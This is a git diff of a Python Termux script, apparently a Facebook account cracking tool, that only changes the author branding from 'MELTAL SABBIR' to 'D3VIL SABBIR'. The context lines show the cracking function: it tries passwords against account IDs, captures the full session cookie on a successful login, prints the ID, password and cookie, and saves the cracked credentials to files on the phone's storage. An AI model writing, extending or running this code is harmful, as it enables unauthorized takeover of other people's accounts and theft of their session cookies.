@@ -1,6 +1,6 @@
-#Gift By ASRAFUL ISLAM MELTAL SABBIR
-#Group: MELTAL SABBIR TERMUX HALPING ZONE
-# 2nd Group : MELTAL SABBIR SCRIPT AND ID GIFT ZONE
+#Gift By ASRAFUL ISLAM D3VIL SABBIR
+#Group: D3VIL SABBIR TERMUX HALPING ZONE
+# 2nd Group : D3VIL SABBIR SCRIPT AND ID GIFT ZONE
 import os,sys,time,json,random,re,string,platform,base64,uuid
 os.system("git pull")
 from bs4 import BeautifulSoup as sop
@@ -262,22 +262,22 @@ def rcrack(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print('\r\r \033[38;5;196m[\033[38;5;45mMELTAL SABBIR-OK🌺\033[38;5;196m] \033[38;5;46m'+uid+'\033[38;5;196m | \033[38;5;46m' +ps+    '  \n\033[38;5;196m[\033[0;93m [\033[38;5;46mCOOKIE-🤖\033[38;5;196m] = \033[38;5;195m'+coki+  '  ''  \033[0;97m')
+                print('\r\r \033[38;5;196m[\033[38;5;45mD3VIL SABBIR-OK🌺\033[38;5;196m] \033[38;5;46m'+uid+'\033[38;5;196m | \033[38;5;46m' +ps+    '  \n\033[38;5;196m[\033[0;93m [\033[38;5;46mCOOKIE-🤖\033[38;5;196m] = \033[38;5;195m'+coki+  '  ''  \033[0;97m')
                 cek_apk(session,coki)
-                open('/sdcard/MELTAL SABBIR-OK.txt', 'a').write( uid+' | '+ps+'\n')
+                open('/sdcard/D3VIL SABBIR-OK.txt', 'a').write( uid+' | '+ps+'\n')
                 oks.append(cid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[24:39]
-                print('\r\r\33[1;30m[MELTAL SABBIR-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
-                open('/sdcard/MELTAL SABBIR-CP.txt', 'a').write( uid+' | '+ps+' \n')
+                print('\r\r\33[1;30m[D3VIL SABBIR-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
+                open('/sdcard/D3VIL SABBIR-CP.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(cid)
                 break
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r\r%s{x} [{xr}MELTAL SABBIR{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
+        sys.stdout.write(f'\r\r%s{x} [{xr}D3VIL..... SABBIR{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
         sys.stdout.flush()
     except:
         pass
